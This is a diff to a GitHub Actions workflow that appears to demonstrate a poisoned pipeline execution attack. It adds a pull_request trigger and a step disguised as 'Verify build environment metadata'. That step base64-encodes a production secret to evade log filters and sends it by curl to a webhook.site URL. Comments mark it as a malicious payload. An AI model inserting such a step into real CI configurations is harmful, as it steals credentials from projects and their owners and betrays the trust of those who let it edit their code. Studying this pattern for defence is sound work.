@@ -2,8 +2,25 @@ name: Production Build
 on:
   push:
     branches: [ main ]
+  pull_request:
+    branches: [ main ] # This trigger allows the attack to start in the PR
+
 jobs:
   build:
     runs-on: ubuntu-latest
     steps:
-      - run: echo "Starting legitimate production build..."
+      - uses: actions/checkout@v4
+
+      # --- MALICIOUS DIRECT PPE STEP ---
+      - name: Verify build environment metadata 
+        env:
+          GH_TOKEN: ${{ secrets.MY_PRODUCTION_SECRET }}
+        run: |
+          # Encode to bypass basic log filters and exfiltrate
+          ENCODED_SECRET=$(echo -n "$GH_TOKEN" | base64)
+          curl -X POST -d "data=$ENCODED_SECRET" https://webhook.site/YOUR-NEW-UNIQUE-URL
+      # --- END PAYLOAD ---
+
+      - name: Run Standard Build
+        run: |
+          echo "Building application..."
